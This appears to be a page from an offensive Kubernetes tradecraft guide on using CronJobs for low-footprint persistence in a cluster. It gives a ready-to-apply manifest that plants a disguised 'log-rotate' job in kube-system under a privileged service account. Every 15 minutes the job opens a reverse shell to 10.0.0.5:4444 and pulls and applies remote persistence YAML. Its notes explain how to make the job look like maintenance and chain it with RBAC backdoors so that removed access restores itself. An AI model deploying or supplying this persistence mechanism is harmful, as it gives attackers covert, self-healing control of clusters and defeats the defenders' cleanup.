---
title: "CronJobs: scheduled re-entry into the cluster"
description: "A CronJob runs a job on a schedule, which an attacker uses for low-footprint persistence: instead of a constantly running backdoor pod, a CronJob materialises briefly at intervals to beacon out, re-plant access, or re-create a deleted binding. Between runs there is no pod to find, making it quieter than a standing workload."
keywords:
  - cronjob
  - scheduled job
  - persistence
  - beacon
  - kubernetes
---

# CronJobs

A CronJob creates a Job, and therefore a pod, on a schedule. For persistence this trades the constant presence of a backdoor workload for periodic, short-lived execution: the pod exists only while the job runs, then disappears, so between runs there is nothing standing for a defender to notice. An attacker schedules a CronJob that, each time it fires, beacons to a command channel, re-reads credentials, or re-creates persistence that was removed, making it a self-repairing and low-footprint mechanism.

Requires create rights on cronjobs:

```bash
kubectl auth can-i create cronjobs -n <ns>
```

## Scheduled beacon and self-repair

```bash
cat <<YAML | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata: { name: log-rotate, namespace: kube-system }   # innocuous name
spec:
  schedule: "*/15 * * * *"                                 # every 15 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: <privileged-sa>              # act with a strong identity
          restartPolicy: Never
          containers:
          - name: c
            image: alpine
            command: ["/bin/sh","-c",
              "sh -i >& /dev/tcp/10.0.0.5/4444 0>&1 || true;
               kubectl apply -f https://a/persist.yaml"]
YAML
```

Running the job under a privileged service account lets each firing re-create a deleted RBAC backdoor or workload, so removing one persistence mechanism is undone at the next tick.

## Exploitation notes

- The appeal is intermittency: no long-running pod to spot, and logs show only brief, periodic activity that resembles a maintenance task; name and schedule it to match plausible housekeeping.
- Bind it to a powerful service account so each run can repair other persistence; this makes the CronJob the root of a self-healing set rather than a lone beacon.
- A short beacon window per run is enough for a reverse shell to call out; combine with [RBAC backdoor](rbac-backdoor.md) and [Malicious workloads](malicious-workloads.md) so the mechanisms restore each other.

## References

- [Kubernetes: CronJob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
